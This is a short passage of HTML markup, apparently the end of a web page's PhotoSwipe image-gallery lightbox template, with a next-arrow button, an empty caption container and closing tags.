            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>
            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>
        </div>
    </div>
</div>






</html>
